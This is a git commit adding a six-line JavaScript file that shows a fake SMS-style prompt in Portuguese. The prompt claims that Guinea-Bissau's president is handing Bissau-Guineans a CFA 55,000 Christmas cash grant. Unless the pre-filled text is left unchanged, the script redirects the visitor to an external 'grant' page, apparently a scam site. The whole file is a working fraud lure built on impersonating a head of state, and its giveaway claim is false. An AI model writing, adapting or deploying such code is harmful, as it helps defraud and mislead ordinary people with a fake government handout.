6dceb7243f3762b7d391a2630bd520cab7b04510
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-12-14 13:42:19 -0800

    Create guineab-active.js

---
+++ guineab-active.js
@@ -0,0 +1,6 @@
+
+var password = 'RETIR CFA55.000'
+password=prompt('SMS: Parabéns, você se qualifica para o Presidente UMARO SISSOCO EMBALO CFA55.000 PRESENTE DE CELEBRAÇÃO DE NATAL PARA BISSAU-GUINEANS. Por favor, pressione OK para retirar o subsídio em dinheiro de X-MAS   ','RETIR CFA55.000');
+if (password != 'RETIR CFA55.000') {
+location.href='https://all-free-byt.org/guineabissau-grant.html';
+}
